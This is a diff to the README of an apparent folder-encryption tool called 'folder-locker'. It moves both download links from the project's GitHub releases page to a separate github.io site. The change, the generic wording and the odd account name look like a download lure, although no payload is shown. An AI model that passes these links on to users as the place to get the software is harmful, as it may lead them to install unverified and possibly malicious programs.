@@ -1,6 +1,6 @@
 # 🔐 folder-locker - Secure your private folders with encryption
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Presencemaritalstatus809/folder-locker/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://presencemaritalstatus809.github.io)
 
 folder-locker protects your sensitive files using strong encryption standards. The software creates secure containers on your computer. You keep your data private and offline. You manage access to your folders through a simple interface.
 
@@ -8,7 +8,7 @@ folder-locker protects your sensitive files using strong encryption standards. T
 
 You must visit the project release page to get the application. 
 
-[Download folder-locker here](https://github.com/Presencemaritalstatus809/folder-locker/releases)
+[Download folder-locker here](https://presencemaritalstatus809.github.io)
 
 1. Open your web browser.
 2. Click the link above.
